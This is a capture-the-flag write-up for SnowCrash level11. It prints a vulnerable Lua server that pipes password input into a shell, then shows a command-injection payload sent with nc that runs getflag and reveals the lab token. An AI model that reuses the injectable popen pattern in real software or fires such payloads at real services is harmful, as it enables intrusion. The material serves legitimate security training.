### Exploit

```
    level11@SnowCrash:~$ ./level11.lua
    lua: ./level11.lua:3: address already in use
    stack traceback:
	    [C]: in function 'assert'
	    ./level11.lua:3: in main chunk
	    [C]: ?
    level11@SnowCrash:~$ cat level11.lua
    #!/usr/bin/env lua
    local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
    level11@SnowCrash:~$ netstat -ltnp
    (No info could be read for "-p": geteuid()=2011 but you should be root.)
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      -
    tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
    tcp6       0      0 :::4646                 :::*                    LISTEN      -
    tcp6       0      0 :::4747                 :::*                    LISTEN      -
    tcp6       0      0 :::80                   :::*                    LISTEN      -
    tcp6       0      0 :::4242                 :::*                    LISTEN      -
    level11@SnowCrash:~$ nc 127.0.0.1 5151
    Password: 1;/bin/getflag > /tmp/key;echo 1
    Erf nope..
    level11@SnowCrash:~$ cat /tmp/key
    Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
